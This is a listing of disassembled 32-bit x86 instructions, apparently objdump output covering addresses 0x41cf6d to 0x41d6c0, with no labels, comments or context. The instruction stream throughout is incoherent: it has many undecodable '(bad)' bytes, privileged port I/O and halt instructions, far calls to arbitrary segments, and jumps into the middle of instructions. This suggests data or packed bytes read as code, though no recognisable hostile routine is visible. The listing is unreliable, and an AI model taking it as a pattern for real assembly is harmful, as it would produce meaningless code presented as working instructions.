  41cf6d:	adc    al,0x1e
  41cf6f:	es inc ebp
  41cf71:	adc    eax,eax
  41cf73:	ss mov edi,0x76998dc8
  41cf79:	(bad)  
  41cf7a:	cmp    eax,0xf70bf118
  41cf7f:	mov    eax,0x67a557a2
  41cf84:	fadd   QWORD PTR [ebp-0x33]
  41cf87:	dec    esp
  41cf88:	sbb    bl,BYTE PTR [edi-0x33aa5c70]
  41cf8e:	mov    eax,0xb2dd7670
  41cf93:	ficomp DWORD PTR [ecx+0x5e]
  41cf96:	out    dx,al
  41cf97:	mov    dl,0xeb
  41cf99:	jb     0x41cf3d
  41cf9b:	mov    ah,0x8
  41cf9d:	mov    cl,0x8e
  41cf9f:	test   BYTE PTR [ebp-0x42],bl
  41cfa2:	inc    edx
  41cfa3:	sti    
  41cfa4:	in     eax,dx
  41cfa5:	arpl   WORD PTR [ebx+eax*1],si
  41cfa8:	call   0xd6b8:0x27694140
  41cfaf:	pop    ebx
  41cfb0:	jae    0x41cfce
  41cfb2:	fistp  DWORD PTR [ebp+0x771fa5af]
  41cfb8:	jbe    0x41cf48
  41cfba:	mov    DWORD PTR [ebp+ecx*8-0x66],eax
  41cfbe:	lods   al,BYTE PTR ds:[esi]
  41cfbf:	and    eax,0xc2a4017c
  41cfc4:	lds    ecx,FWORD PTR [esi+0x7e20ccce]
  41cfca:	jbe    0x41d038
  41cfcc:	rcr    BYTE PTR [ebp+edx*8-0x5c],cl
  41cfd0:	hlt    
  41cfd1:	sbb    eax,0xa08f30c7
  41cfd6:	les    esp,FWORD PTR [ebx+ebp*1-0x25]
  41cfda:	add    ecx,ebp
  41cfdc:	adc    DWORD PTR [ebp+0x47],ebx
  41cfdf:	xor    BYTE PTR [esp+ecx*4-0x45],dl
  41cfe3:	repz aad 0x30
  41cfe6:	push   ss
  41cfe7:	xchg   BYTE PTR [ebp+0x3e21ef24],ah
  41cfed:	test   bl,al
  41cfef:	scas   eax,DWORD PTR es:[edi]
  41cff0:	out    0x71,eax
  41cff2:	mov    ah,0x5b
  41cff4:	int3   
  41cff5:	scas   eax,DWORD PTR es:[edi]
  41cff6:	fld    QWORD PTR [eax+0x15]
  41cff9:	sub    BYTE PTR [edi-0x2fd3cdb4],ah
  41cfff:	les    ebx,FWORD PTR [esi-0x7f5abcb8]
  41d005:	inc    edi
  41d006:	and    ebp,esp
  41d008:	xchg   edx,eax
  41d009:	jno    0x41d06d
  41d00b:	jmp    0x41d025
  41d00d:	ja     0x41cfa4
  41d00f:	xchg   edi,eax
  41d010:	dec    edx
  41d011:	es inc ecx
  41d013:	es in  eax,0xe1
  41d016:	popf   
  41d017:	imul   esp,DWORD PTR [ebx],0xffffffbb
  41d01a:	mov    ch,0x68
  41d01c:	test   eax,0x20926a73
  41d021:	mov    DWORD PTR [edx+edx*8-0x6a472bac],ebx
  41d028:	jge    0x41d019
  41d02a:	popf   
  41d02b:	or     bl,BYTE PTR [edi+0x261b55cf]
  41d031:	call   DWORD PTR [ecx+0x7e16397]
  41d037:	arpl   dx,dx
  41d039:	loope  0x41cff8
  41d03b:	push   ecx
  41d03c:	xlat   BYTE PTR ds:[ebx]
  41d03d:	scas   al,BYTE PTR es:[edi]
  41d03e:	out    dx,al
  41d03f:	dec    esp
  41d040:	adc    ecx,eax
  41d042:	mov    edx,DWORD PTR [ecx+esi*4+0x6e654742]
  41d049:	lock sbb eax,0xf3afaaf8
  41d04f:	adc    DWORD PTR [esi+0x67],0x7
  41d053:	mov    ebx,0xaf04422f
  41d058:	or     DWORD PTR ds:0x510fd78d,esi
  41d05e:	push   edx
  41d05f:	scas   eax,DWORD PTR es:[edi]
  41d060:	(bad)  
  41d061:	retf   
  41d062:	scas   al,BYTE PTR es:[edi]
  41d063:	add    al,0x2
  41d065:	push   0xffffffb8
  41d067:	imul   ebx,DWORD PTR [ebp-0x51],0x5f08bf8e
  41d06e:	or     ecx,0xffffffa0
  41d071:	sbb    esi,ecx
  41d073:	lods   al,BYTE PTR ds:[esi]
  41d074:	or     al,bh
  41d076:	mov    eax,0xc80e984e
  41d07b:	lahf   
  41d07c:	jbe    0x41d0b3
  41d07e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d07f:	and    esp,eax
  41d081:	stos   DWORD PTR es:[edi],eax
  41d082:	add    ebp,DWORD PTR [edx]
  41d084:	retf   0x91f
  41d087:	fisub  DWORD PTR [eax]
  41d089:	mov    ah,0x86
  41d08b:	loop   0x41d03a
  41d08d:	and    bh,BYTE PTR [eax-0x64]
  41d090:	test   BYTE PTR [edi-0x518850de],al
  41d096:	int3   
  41d097:	shr    edx,1
  41d099:	xchg   esp,eax
  41d09a:	dec    esi
  41d09b:	push   es
  41d09c:	stos   DWORD PTR es:[edi],eax
  41d09d:	pop    es
  41d09e:	sub    edx,DWORD PTR [edi]
  41d0a0:	xor    eax,0x41d9c08b
  41d0a5:	ins    DWORD PTR es:[edi],dx
  41d0a6:	in     eax,dx
  41d0a7:	dec    eax
  41d0a8:	sbb    bh,dh
  41d0aa:	js     0x41d0e6
  41d0ac:	push   ebp
  41d0ad:	jmp    0xab76:0x85a3081d
  41d0b4:	push   edx
  41d0b5:	mov    bh,0x9a
  41d0b7:	dec    edi
  41d0b8:	arpl   bp,dx
  41d0ba:	fstp   DWORD PTR [esi-0x2b]
  41d0bd:	or     DWORD PTR [esi-0x75ddb4fc],esp
  41d0c3:	mov    eax,ds:0x1bb72242
  41d0c8:	stos   DWORD PTR es:[edi],eax
  41d0c9:	cmp    eax,0xaaeab83
  41d0ce:	inc    ebx
  41d0cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0d0:	and    DWORD PTR [esi],edx
  41d0d2:	rcr    cl,cl
  41d0d4:	dec    esp
  41d0d5:	shr    dl,1
  41d0d7:	add    eax,DWORD PTR [ecx]
  41d0d9:	pop    ebx
  41d0da:	jle    0x41d115
  41d0dc:	dec    ecx
  41d0dd:	push   edi
  41d0de:	(bad)  
  41d0df:	arpl   cx,si
  41d0e1:	sbb    DWORD PTR [ebp-0x2c],ebx
  41d0e4:	js     0x41d099
  41d0e6:	arpl   WORD PTR [edi+0x24],sp
  41d0e9:	push   esi
  41d0ea:	adc    edx,DWORD PTR [esi+0x27]
  41d0ed:	jb     0x41d159
  41d0ef:	and    BYTE PTR [esi-0xc],0xb8
  41d0f3:	test   BYTE PTR ds:0x6c325096,0x46
  41d0fa:	aam    0x48
  41d0fc:	jno    0x41d135
  41d0fe:	pop    ebp
  41d0ff:	push   eax
  41d100:	das    
  41d101:	jp     0x41d100
  41d103:	mov    edi,0x398b7cb8
  41d108:	xor    BYTE PTR fs:[esi],dh
  41d10b:	out    0x88,eax
  41d10d:	jne    0x41d12e
  41d10f:	add    ah,BYTE PTR [esi-0x46]
  41d112:	hlt    
  41d113:	aas    
  41d114:	int    0x69
  41d116:	cmp    ch,BYTE PTR [edi+0x6]
  41d119:	lods   al,BYTE PTR ds:[esi]
  41d11a:	or     DWORD PTR [edi-0xd],ebx
  41d11d:	xor    bh,ah
  41d11f:	push   ecx
  41d120:	pusha  
  41d121:	mov    cl,BYTE PTR [ebp+ebx*1-0x67]
  41d125:	test   ch,bh
  41d127:	int3   
  41d128:	push   esp
  41d129:	or     eax,0xbf83b820
  41d12e:	aad    0xc2
  41d130:	shl    BYTE PTR [edx-0x61],cl
  41d133:	das    
  41d134:	jl     0x41d10f
  41d136:	aad    0xa7
  41d138:	in     eax,dx
  41d139:	inc    ebx
  41d13a:	aam    0x20
  41d13c:	push   ecx
  41d13e:	je     0x41d160
  41d140:	repnz lea edi,[edi+esi*2]
  41d144:	aam    0x38
  41d146:	loope  0x41d1af
  41d148:	fcomp  QWORD PTR [ebp-0x7]
  41d14b:	bound  esp,QWORD PTR [ecx+0x29948466]
  41d151:	inc    edi
  41d152:	loop   0x41d11f
  41d154:	mov    BYTE PTR [ecx+eiz*8],cl
  41d157:	add    DWORD PTR [ebx-0x2a],ecx
  41d15a:	cmp    dh,bl
  41d15c:	and    al,0x88
  41d15e:	sbb    BYTE PTR [ebx+0x769db11e],0x3b
  41d165:	dec    eax
  41d166:	shl    DWORD PTR [ecx+0x3],cl
  41d169:	addr16 sub eax,0x16581918
  41d16f:	jle    0x41d114
  41d171:	or     BYTE PTR [esi+0x1d],0xde
  41d175:	cld    
  41d176:	mov    eax,0x8725782
  41d17b:	and    eax,0xa945fb97
  41d180:	mov    edi,0xbb8d3a63
  41d185:	xor    BYTE PTR [edi],bh
  41d187:	jge    0x41d1ab
  41d189:	fmulp  st(4),st
  41d18b:	sar    DWORD PTR fs:[ecx],1
  41d18e:	imul   ebp,esi,0x45
  41d191:	cwde   
  41d192:	jns    0x41d211
  41d194:	mov    eax,ds:0x11a007fb
  41d199:	jae    0x41d1bb
  41d19b:	pop    edx
  41d19c:	or     BYTE PTR [ebp-0x6bb68d71],al
  41d1a2:	push   0x32
  41d1a4:	ins    BYTE PTR es:[edi],dx
  41d1a5:	or     DWORD PTR [ebx],eax
  41d1a7:	push   ss
  41d1a8:	inc    esp
  41d1a9:	or     al,0x80
  41d1ab:	(bad)  
  41d1ac:	out    dx,al
  41d1ad:	add    al,0xab
  41d1af:	call   0x5a3714bd
  41d1b4:	fmul   st(2),st
  41d1b6:	inc    esi
  41d1b7:	(bad)  
  41d1b8:	lds    esp,FWORD PTR [ebx]
  41d1ba:	lds    ebp,FWORD PTR [esi-0x3d42329e]
  41d1c0:	stos   BYTE PTR es:[edi],al
  41d1c1:	dec    esi
  41d1c2:	and    eax,0xf28de4b4
  41d1c7:	jns    0x41d167
  41d1c9:	mov    esi,0x1576d05f
  41d1ce:	jecxz  0x41d1d9
  41d1d0:	xchg   BYTE PTR [ebp-0x57d6f10e],ah
  41d1d6:	inc    esi
  41d1d7:	fisubr DWORD PTR [ecx]
  41d1d9:	mov    WORD PTR [ebx-0x72],?
  41d1dc:	pop    eax
  41d1dd:	cmp    al,0xbb
  41d1df:	loop   0x41d236
  41d1e1:	fwait
  41d1e2:	stc    
  41d1e3:	fistp  QWORD PTR ds:0x277ae20a
  41d1e9:	jmp    0x6af77470
  41d1ee:	popf   
  41d1ef:	popa   
  41d1f0:	push   ebx
  41d1f1:	rcr    DWORD PTR [ebx-0x26],cl
  41d1f4:	out    0x2e,al
  41d1f6:	sar    BYTE PTR [esi-0x3],1
  41d1f9:	icebp  
  41d1fa:	jnp    0x41d1a9
  41d1fc:	cmc    
  41d1fd:	fst    QWORD PTR [ecx]
  41d1ff:	sub    DWORD PTR [edx],ebp
  41d201:	pop    esp
  41d202:	xchg   edx,eax
  41d203:	test   eax,0x4444a5a8
  41d208:	mov    eax,es:0xb6a17503
  41d20e:	test   al,0xc6
  41d210:	imul   edi,DWORD PTR [esi+ebx*2-0x25883c37],0x6fe6e6de
  41d21b:	pushf  
  41d21c:	iret   
  41d21d:	(bad)  
  41d21e:	clc    
  41d21f:	xor    al,0x83
  41d221:	icebp  
  41d222:	and    eax,0x478d8c17
  41d227:	es xor eax,0xccf18242
  41d22d:	add    BYTE PTR [edx-0x7e6e4e6f],dl
  41d233:	ret    0x4899
  41d236:	xlat   BYTE PTR ds:[ebx]
  41d237:	sbb    BYTE PTR [edi-0x75],ch
  41d23a:	xchg   edx,eax
  41d23b:	jmp    0x41d28e
  41d23d:	rcl    BYTE PTR [edx-0x10c69fed],1
  41d243:	aad    0x6a
  41d245:	sti    
  41d246:	jg     0x41d1f8
  41d248:	sbb    BYTE PTR [ebp+0x74],0x45
  41d24c:	mov    bl,0x6b
  41d24e:	add    al,0x79
  41d250:	icebp  
  41d251:	test   DWORD PTR [esi],esp
  41d253:	cmp    eax,0xecadc4f9
  41d258:	nop
  41d259:	xor    al,0x1b
  41d25b:	push   edi
  41d25c:	out    dx,eax
  41d25d:	and    dl,BYTE PTR ds:0x23924a1a
  41d263:	outs   dx,BYTE PTR ds:[esi]
  41d264:	xchg   ecx,eax
  41d265:	pop    edx
  41d266:	in     eax,0x1d
  41d268:	pusha  
  41d269:	scas   eax,DWORD PTR es:[edi]
  41d26a:	ins    DWORD PTR es:[edi],dx
  41d26b:	rol    cl,0x63
  41d26e:	push   esi
  41d26f:	adc    ebp,ebx
  41d271:	scas   eax,DWORD PTR es:[edi]
  41d272:	xlat   BYTE PTR ds:[ebx]
  41d273:	pusha  
  41d274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d275:	jmp    0x63aae061
  41d27a:	fmul   st,st(4)
  41d27c:	or     al,al
  41d27e:	mov    edx,0xe7362148
  41d283:	jle    0x41d264
  41d285:	jmp    0x41d260
  41d287:	cwde   
  41d288:	sub    edi,DWORD PTR [esi+ecx*1+0x64f416e5]
  41d28f:	cmp    BYTE PTR [ebx],dh
  41d291:	(bad)  
  41d292:	sub    BYTE PTR [edi+edx*4-0x4ddea4de],ch
  41d299:	sub    DWORD PTR [edi+0x71],0xffffffce
  41d29d:	or     dh,dl
  41d29f:	ret    
  41d2a0:	repz imul eax,DWORD PTR [esi-0x52c9c0a1],0xffffffad
  41d2a8:	xlat   BYTE PTR ds:[ebx]
  41d2a9:	test   BYTE PTR [edi+0xe],cl
  41d2ac:	mov    ds:0xf129dc7c,eax
  41d2b1:	icebp  
  41d2b2:	nop
  41d2b3:	jae    0x41d2a3
  41d2b5:	mov    bl,0x38
  41d2b7:	nop
  41d2b8:	dec    ecx
  41d2b9:	out    0xaa,al
  41d2bb:	add    BYTE PTR [edi+edi*8],0xf0
  41d2bf:	stos   BYTE PTR es:[edi],al
  41d2c0:	mov    eax,0xa8d74b4a
  41d2c5:	cmp    ebx,edx
  41d2c7:	push   edx
  41d2c8:	cmc    
  41d2c9:	aam    0xbe
  41d2cb:	dec    ebp
  41d2cc:	into   
  41d2cd:	mov    WORD PTR [eax-0x4da06068],cs
  41d2d3:	xor    cl,ch
  41d2d5:	dec    eax
  41d2d6:	dec    esp
  41d2d7:	mov    BYTE PTR [edi-0x2bd34dda],ch
  41d2dd:	adc    DWORD PTR [eax+0x3366ca35],edx
  41d2e3:	int3   
  41d2e4:	gs jp  0x41d29c
  41d2e7:	mov    esi,0xdcacb2ec
  41d2ec:	retf   0xe96f
  41d2ef:	es add al,0x3
  41d2f2:	sub    ecx,DWORD PTR [edx+eiz*1-0x79]
  41d2f6:	jmp    0x41d2cd
  41d2f8:	mov    ch,0xb8
  41d2fa:	sbb    al,BYTE PTR [esi+ecx*8-0x78]
  41d2fe:	stos   BYTE PTR es:[edi],al
  41d2ff:	addr16 clc 
  41d301:	out    dx,eax
  41d302:	mov    ch,0x20
  41d304:	cmp    DWORD PTR [ecx+eax*2],0xffffffb3
  41d308:	sti    
  41d309:	add    ebp,DWORD PTR [esi-0xb98336]
  41d30f:	inc    esp
  41d310:	lahf   
  41d311:	adc    DWORD PTR [edx+0x2e],eax
  41d314:	rcr    BYTE PTR [edi+0x77f680cd],cl
  41d31a:	jne    0x41d37d
  41d31c:	call   0x3043:0xed0eca0f
  41d323:	jns    0x41d2f6
  41d325:	rcr    BYTE PTR [eax-0x24854e4],0x36
  41d32c:	out    dx,al
  41d32d:	xchg   edi,eax
  41d32e:	jle    0x41d366
  41d330:	or     al,0xa4
  41d332:	mov    dl,0x6c
  41d334:	push   ss
  41d335:	addr16 clc 
  41d337:	hlt    
  41d338:	mov    dl,0xfe
  41d33a:	aas    
  41d33b:	das    
  41d33c:	mov    bl,0x12
  41d33e:	mov    DWORD PTR [edx+0x597c752f],ecx
  41d344:	rcr    BYTE PTR [ebx],0xe
  41d347:	int    0x5
  41d349:	cmp    al,0xc
  41d34b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d34c:	outs   dx,BYTE PTR ds:[esi]
  41d34d:	(bad)  
  41d34e:	sbb    BYTE PTR [eax],bl
  41d350:	fild   WORD PTR [eax]
  41d352:	inc    ebp
  41d353:	pmuludq mm7,QWORD PTR [esi+0x44]
  41d357:	cld    
  41d358:	dec    edi
  41d359:	retf   
  41d35a:	mov    eax,ds:0x214feec2
  41d35f:	cmp    DWORD PTR [edx+0x5081388b],esi
  41d365:	ss cmp edi,eax
  41d368:	mov    ds:0x890d572f,eax
  41d36d:	nop
  41d36e:	fcom   DWORD PTR [ecx+0x2527a125]
  41d374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d375:	je     0x41d387
  41d377:	adc    eax,esi
  41d379:	(bad)  
  41d37a:	out    dx,eax
  41d37b:	pop    edi
  41d37c:	pop    es
  41d37d:	sbb    al,0xff
  41d37f:	xchg   ebx,eax
  41d380:	xor    DWORD PTR [eax],ebp
  41d382:	dec    edi
  41d383:	fwait
  41d384:	mov    cl,0xbb
  41d386:	leave  
  41d387:	in     eax,dx
  41d388:	mov    bl,0xeb
  41d38a:	cmp    eax,0x25805c05
  41d38f:	xchg   ecx,eax
  41d390:	adc    BYTE PTR [ebx],bl
  41d392:	push   0x8da6f12b
  41d397:	popa   
  41d398:	adc    al,0x9
  41d39a:	mov    dh,0xf5
  41d39c:	push   es
  41d39d:	dec    esi
  41d39e:	mov    edx,0x17ca59cc
  41d3a3:	imul   esp,edx,0x20ea7c5c
  41d3a9:	pop    edx
  41d3aa:	in     eax,0x45
  41d3ac:	cmp    DWORD PTR [edx+0x427127ac],ebp
  41d3b2:	mov    dh,0x27
  41d3b4:	jb     0x41d40f
  41d3b6:	test   BYTE PTR [ecx+0x375b8966],bh
  41d3bc:	repz inc edi
  41d3be:	enter  0x6720,0x9e
  41d3c2:	test   BYTE PTR [edi-0x3ca0ffcc],0xeb
  41d3c9:	xchg   BYTE PTR ds:0xb9aadc1,ah
  41d3cf:	in     eax,dx
  41d3d0:	sbb    ebx,DWORD PTR [esi+ebx*1]
  41d3d3:	nop
  41d3d4:	mov    ecx,0x71174f3c
  41d3d9:	repz ret 0x8c47
  41d3dd:	xor    eax,0xa6919568
  41d3e2:	pop    ds
  41d3e3:	stos   BYTE PTR es:[edi],al
  41d3e4:	push   eax
  41d3e5:	inc    edx
  41d3e6:	mov    ds:0xed893df9,eax
  41d3eb:	dec    esi
  41d3ec:	sub    al,0xa4
  41d3ee:	(bad)  [ebx]
  41d3f0:	mov    fs,WORD PTR [edi-0xe]
  41d3f3:	sbb    BYTE PTR cs:[ebp+edi*1-0x6d],dh
  41d3f8:	popa   
  41d3f9:	inc    eax
  41d3fa:	dec    ebx
  41d3fb:	std    
  41d3fc:	(bad)  
  41d3fd:	(bad)  
  41d3fe:	fsubp  st(4),st
  41d400:	inc    edi
  41d401:	sbb    ah,cl
  41d403:	cmp    DWORD PTR ds:0x1e6b6441,esp
  41d409:	je     0x41d39a
  41d40b:	cmc    
  41d40c:	push   ebx
  41d40d:	jecxz  0x41d475
  41d40f:	rcl    DWORD PTR [edi],1
  41d411:	outs   dx,DWORD PTR ds:[esi]
  41d412:	xlat   BYTE PTR ds:[ebx]
  41d413:	inc    ebp
  41d414:	sbb    eax,0xc4685b48
  41d419:	push   0xffffffc5
  41d41b:	inc    esi
  41d41c:	pop    es
  41d41d:	je     0x41d3b1
  41d41f:	xchg   edi,eax
  41d420:	push   es
  41d421:	ds jge 0x41d3a9
  41d424:	adc    edx,DWORD PTR [edx+eax*8]
  41d427:	adc    DWORD PTR [ebp-0x2e],esp
  41d42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d42b:	rcr    BYTE PTR [ecx+0x9],cl
  41d42e:	(bad)  
  41d42f:	(bad)  
  41d430:	loope  0x41d488
  41d432:	aaa    
  41d433:	and    eax,0xc30527a1
  41d438:	test   BYTE PTR [edi+edx*4],dl
  41d43b:	fstp   TBYTE PTR [ebp+ebx*8-0x6b]
  41d43f:	adc    ebp,DWORD PTR [ebx]
  41d441:	adc    cl,bh
  41d443:	outs   dx,DWORD PTR ds:[esi]
  41d444:	sbb    BYTE PTR [esi],0x32
  41d447:	fdiv   st(5),st
  41d449:	and    BYTE PTR [eax+0x64030453],cl
  41d44f:	shl    BYTE PTR [edi],0x9a
  41d452:	aam    0xbe
  41d454:	xchg   edx,eax
  41d455:	out    0xc6,al
  41d457:	xor    ch,bh
  41d459:	inc    edi
  41d45a:	fisubr DWORD PTR [edx+eax*8]
  41d45d:	cmp    eax,0xb9766965
  41d462:	ss mov dl,0x99
  41d465:	xchg   ebx,eax
  41d466:	sbb    al,0x3e
  41d468:	mov    fs,WORD PTR fs:[eax+0x47141bae]
  41d46f:	xchg   edx,ebp
  41d471:	ds std 
  41d473:	pop    ecx
  41d474:	xchg   ebp,eax
  41d475:	test   DWORD PTR [edx-0x70760076],0x10530b08
  41d47f:	pop    ebx
  41d480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d481:	sbb    al,0x60
  41d483:	icebp  
  41d484:	loope  0x41d40c
  41d486:	stc    
  41d487:	mov    esp,0x2e146009
  41d48c:	inc    esp
  41d48d:	aas    
  41d48e:	push   esi
  41d48f:	cmp    DWORD PTR [esi+0xb],ecx
  41d492:	mov    bl,BYTE PTR [ecx]
  41d494:	in     eax,0x9a
  41d496:	mov    ch,0xd0
  41d498:	cmp    WORD PTR [ecx-0x18],sp
  41d49c:	jmp    0x41d4c1
  41d49e:	jecxz  0x41d4c8
  41d4a0:	pop    ecx
  41d4a1:	inc    ecx
  41d4a2:	pop    ss
  41d4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4a4:	imul   edi,DWORD PTR [ebx],0x49d11cf5
  41d4aa:	adc    DWORD PTR [ecx-0x6b],0x527e04ea
  41d4b1:	stos   BYTE PTR es:[edi],al
  41d4b2:	mov    ah,0xa6
  41d4b4:	outs   dx,BYTE PTR ds:[esi]
  41d4b5:	sbb    eax,0x3758b80a
  41d4ba:	cmp    bl,ah
  41d4bc:	dec    edi
  41d4bd:	xchg   esp,eax
  41d4be:	mov    bl,0xde
  41d4c0:	out    dx,eax
  41d4c1:	enter  0x95fc,0x87
  41d4c5:	sub    BYTE PTR [eax+0x2b],dl
  41d4c8:	pushf  
  41d4c9:	inc    eax
  41d4ca:	lods   eax,DWORD PTR ds:[esi]
  41d4cb:	repnz fisub DWORD PTR [ebp-0x329a0edf]
  41d4d2:	mov    edx,0x7ce26a4
  41d4d7:	cli    
  41d4d8:	xchg   ebp,eax
  41d4d9:	jb     0x41d49b
  41d4db:	mov    ebx,0x39d359b7
  41d4e0:	sbb    bl,BYTE PTR [esp+eiz*4]
  41d4e3:	cmp    DWORD PTR [edx+0x22],esi
  41d4e6:	lahf   
  41d4e7:	and    ah,BYTE PTR [ebp-0x61]
  41d4ea:	pop    esp
  41d4eb:	sbb    eax,0x521422ef
  41d4f0:	cmp    DWORD PTR [ebp+0x36b6dfa2],0x58f9057f
  41d4fa:	iret   
  41d4fb:	clc    
  41d4fc:	out    dx,al
  41d4fd:	add    DWORD PTR [ecx],eax
  41d4ff:	and    BYTE PTR [ecx+esi*4-0x74],dl
  41d503:	int3   
  41d504:	stc    
  41d505:	xchg   edx,eax
  41d506:	stc    
  41d507:	dec    ebx
  41d508:	mov    DWORD PTR [ebx],ebp
  41d50a:	sub    BYTE PTR [ebp+0x1c],cl
  41d50d:	xchg   esi,eax
  41d50e:	push   eax
  41d50f:	cmp    al,0x81
  41d511:	mov    ds:0x98e4fd3a,eax
  41d516:	arpl   WORD PTR ds:0x5a92f923,sp
  41d51c:	in     eax,dx
  41d51d:	popa   
  41d51e:	fadd   st(1),st
  41d520:	cmp    edi,ecx
  41d522:	fistp  QWORD PTR [eax+0x4816870f]
  41d528:	aad    0xad
  41d52a:	sub    esp,ebx
  41d52c:	int3   
  41d52d:	out    0xa2,eax
  41d52f:	dec    ebx
  41d530:	mov    eax,ds:0x53885a79
  41d535:	pop    ebp
  41d536:	lods   eax,DWORD PTR ds:[esi]
  41d537:	ret    
  41d538:	add    DWORD PTR [ebx+0x79],0xf929dc35
  41d53f:	mov    ch,0x79
  41d541:	cmp    dl,bl
  41d543:	sar    DWORD PTR [eax-0x62],0x4a
  41d547:	pusha  
  41d548:	add    DWORD PTR [eax+0x75],0x4a
  41d54c:	dec    ebx
  41d54d:	aad    0x25
  41d54f:	lods   al,BYTE PTR ds:[esi]
  41d550:	mov    eax,ds:0x1dec5087
  41d555:	je     0x41d51e
  41d557:	std    
  41d558:	fadd   DWORD PTR [eax+0x2929e76b]
  41d55e:	cmp    ah,BYTE PTR [edx+eiz*4]
  41d561:	lea    ebp,ds:0x976714a0
  41d567:	daa    
  41d568:	add    edx,DWORD PTR [esi*4-0x589f48a]
  41d56f:	out    0x7d,eax
  41d571:	leave  
  41d572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d573:	push   esi
  41d574:	ss xchg edx,eax
  41d576:	daa    
  41d577:	xchg   ebx,eax
  41d578:	and    BYTE PTR [edi+eiz*4-0x4a],0x88
  41d57d:	stc    
  41d57e:	ins    DWORD PTR es:[edi],dx
  41d57f:	mov    ch,BYTE PTR [ebx+ecx*2-0x12]
  41d583:	pop    eax
  41d584:	dec    ebp
  41d585:	fsubr  QWORD PTR [edi-0x21457849]
  41d58b:	ret    0x5e8c
  41d58e:	into   
  41d58f:	clc    
  41d590:	xor    dh,BYTE PTR [ebp+0x5c]
  41d593:	cvtps2pi mm5,QWORD PTR [eax-0x3f4cbbec]
  41d59a:	jne    0x41d5a4
  41d59c:	shl    DWORD PTR [ecx],1
  41d59e:	add    eax,DWORD PTR [edi+0x9]
  41d5a1:	mov    dh,0xf9
  41d5a3:	fs sub al,0x19
  41d5a6:	lds    edx,FWORD PTR [ebx+0x63a1cfaf]
  41d5ac:	add    esi,esi
  41d5ae:	mov    edi,DWORD PTR [eax-0x67928d91]
  41d5b4:	clc    
  41d5b5:	fxtract 
  41d5b7:	clc    
  41d5b8:	out    dx,al
  41d5b9:	sub    BYTE PTR [ebx],bh
  41d5bb:	sbb    eax,0x9eec99e0
  41d5c0:	jmp    0x2dd83ac
  41d5c5:	not    DWORD PTR ds:0x6f385190
  41d5cb:	jl     0x41d636
  41d5cd:	cmc    
  41d5ce:	fstp   DWORD PTR [edi-0x2a]
  41d5d1:	mov    ds:0x97056d4a,al
  41d5d6:	add    DWORD PTR [edi+edi*4],esi
  41d5d9:	mov    ds:0x197eb1f,al
  41d5de:	ror    dh,cl
  41d5e0:	(bad)  
  41d5e1:	lea    ebx,[ebx+0x3f38a7d7]
  41d5e7:	hlt    
  41d5e8:	sbb    DWORD PTR [ebp-0x13],esp
  41d5eb:	sbb    dl,BYTE PTR [eax+ebx*1+0x14]
  41d5ef:	out    0x1b,eax
  41d5f1:	nop
  41d5f2:	mov    cl,BYTE PTR [edi+eax*8-0x26dbce98]
  41d5f9:	push   edi
  41d5fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5fb:	pop    ebx
  41d5fc:	(bad)  
  41d5fd:	lds    ecx,FWORD PTR [bp+si-0x4784]
  41d602:	sbb    DWORD PTR [ebx-0x14],0x43
  41d606:	push   eax
  41d607:	test   al,0x5b
  41d609:	and    edi,0xffffff97
  41d60c:	add    eax,0x4ff5bc5c
  41d611:	or     eax,0x1c454bad
  41d616:	js     0x41d60d
  41d618:	inc    ebx
  41d619:	push   cs
  41d61a:	mov    al,ds:0x3975a99f
  41d61f:	ss pop edx
  41d621:	scas   eax,DWORD PTR es:[edi]
  41d622:	push   ds
  41d623:	fcom   DWORD PTR [edi-0x4f]
  41d626:	repz in eax,dx
  41d628:	dec    eax
  41d629:	sar    ebx,cl
  41d62b:	adc    DWORD PTR [esi-0x36bc1383],0xffffffe7
  41d632:	or     al,0x63
  41d634:	outs   dx,BYTE PTR ds:[esi]
  41d635:	loope  0x41d66c
  41d637:	or     edi,ebx
  41d639:	adc    esp,DWORD PTR [edi]
  41d63b:	ins    BYTE PTR es:[edi],dx
  41d63c:	das    
  41d63d:	dec    edi
  41d63e:	mov    bl,0x2c
  41d640:	mov    esp,0x7f22abf6
  41d645:	popf   
  41d646:	mov    ds:0xecc44f9f,al
  41d64b:	or     DWORD PTR es:[esi],0xffffffd9
  41d64f:	mov    esp,0x5d7732dd
  41d654:	xchg   edx,eax
  41d655:	repz push eax
  41d657:	or     eax,0xe242b4e8
  41d65c:	jno    0x41d667
  41d65e:	test   al,0xa1
  41d660:	aad    0x60
  41d662:	fcom   DWORD PTR [edx-0x720b5208]
  41d668:	pop    ss
  41d669:	push   ss
  41d66a:	in     eax,0x26
  41d66c:	xchg   esp,eax
  41d66d:	jnp    0x41d663
  41d66f:	mov    dl,0xd8
  41d671:	inc    edi
  41d672:	cmp    DWORD PTR [esi+0x180a2fb0],ebp
  41d678:	pop    ebp
  41d679:	daa    
  41d67a:	lock out 0x9,al
  41d67d:	ins    BYTE PTR es:[edi],dx
  41d67e:	test   eax,0xfad68ff1
  41d683:	push   eax
  41d684:	mov    ds,si
  41d687:	pop    esi
  41d688:	loop   0x41d624
  41d68a:	cmp    eax,0x408d973b
  41d68f:	pop    esp
  41d690:	loope  0x41d6c4
  41d692:	or     bh,BYTE PTR [ebx]
  41d694:	mov    dh,0xab
  41d696:	or     ebx,DWORD PTR [ebx-0x4b9a7d28]
  41d69c:	in     eax,0xee
  41d69e:	clc    
  41d69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6a0:	das    
  41d6a1:	stos   DWORD PTR es:[edi],eax
  41d6a2:	pop    eax
  41d6a3:	sub    eax,0x966b65ec
  41d6a8:	das    
  41d6a9:	call   0x37d88650
  41d6ae:	adc    BYTE PTR [ecx-0x5b],bl
  41d6b1:	shl    al,cl
  41d6b3:	xchg   DWORD PTR [ebx],ecx
  41d6b5:	sbb    al,0xd7
  41d6b7:	out    0x6,al
  41d6b9:	jge    0x41d680
  41d6bb:	mov    ds:0x985b2ce3,al
  41d6c0:	sti    
